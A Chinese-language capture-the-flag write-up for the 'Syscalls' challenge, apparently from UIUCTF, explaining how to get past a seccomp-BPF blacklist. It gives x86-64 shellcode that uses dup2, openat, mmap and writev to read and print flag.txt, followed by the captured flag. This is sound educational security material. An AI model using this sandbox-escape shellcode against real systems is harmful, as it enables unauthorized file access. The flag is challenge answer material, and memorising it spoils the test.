# Syscalls

## 题目简述

程序先把最多 175 字节输入读入可执行栈，再安装 seccomp-BPF，最后直接跳转执行输入。代码执行本身已经给出，真正限制是过滤器封禁 `read`、`write`、`open`、`pread64`、`readv`、`sendfile`、`fork`、`execve`、`splice`、`preadv`、`pwritev`、`execveat` 等常见出站路径，并对 `writev` 的文件描述符额外设限。

## 解题过程

逐条解析 25 条 BPF 指令可知：除黑名单外的系统调用默认允许；`writev`（20）只有在第一个参数的低 32 位大于 1000 时才放行。标准输出 fd 1 会被杀死，但 `dup2`（33）没有被封禁，所以先把 stdout 复制到一个合法高编号 fd：

```asm
mov rdi, 1
mov rsi, 0x1000
mov rax, 33          /* dup2(1, 4096) */
syscall
```

`open` 被禁但 `openat`（257）可用。把 `flag.txt\0` 压栈，以 `AT_FDCWD=-100` 和只读标志打开文件。由于 `read` 类调用不可用，再用允许的 `mmap`（9）把文件映射进内存：

```asm
xor eax, eax
push rax
mov rax, 0x7478742e67616c66
push rax              /* "flag.txt" */
mov rdi, -100
mov rsi, rsp
xor edx, edx
mov eax, 257           /* openat */
syscall

xor edi, edi
mov esi, 0x14
mov edx, 1             /* PROT_READ */
mov r10d, 1            /* MAP_SHARED */
mov r8, rax            /* fd */
xor r9d, r9d
mov eax, 9             /* mmap */
syscall
```

虽然映射长度写成 0x14，内核按页建立映射，随后可读取同一文件页内更长的 Flag。最后在栈上构造一个 `iovec { base=mmap_result, len=0x38 }`，通过高编号 fd 4096 调用 `writev`：

```asm
push 0x38
push rax
mov rdi, 0x1000
mov rsi, rsp
mov rdx, 1
mov rax, 20            /* writev */
syscall
```

汇编后的完整 shellcode 长度低于 175 字节。发送后直接得到：

```text
uiuctf{a532aaf9aaed1fa5906de364a1162e0833c57a0246ab9ffc}
```

## 方法总结

- seccomp 黑名单容易遗漏语义等价调用：`openat` 替代 `open`，`mmap` 替代 `read`，`writev` 替代 `write`。
- 参数过滤只要求 `writev` 的 fd 大于 1000，而未封禁 `dup2`，因此可以从已有 stdout 构造满足条件的新描述符。
- 写 shellcode 前应把 BPF 跳转完整还原成“系统调用号 + 参数约束”表，并同时满足输入长度、字节序、寄存器调用约定和 iovec 布局。
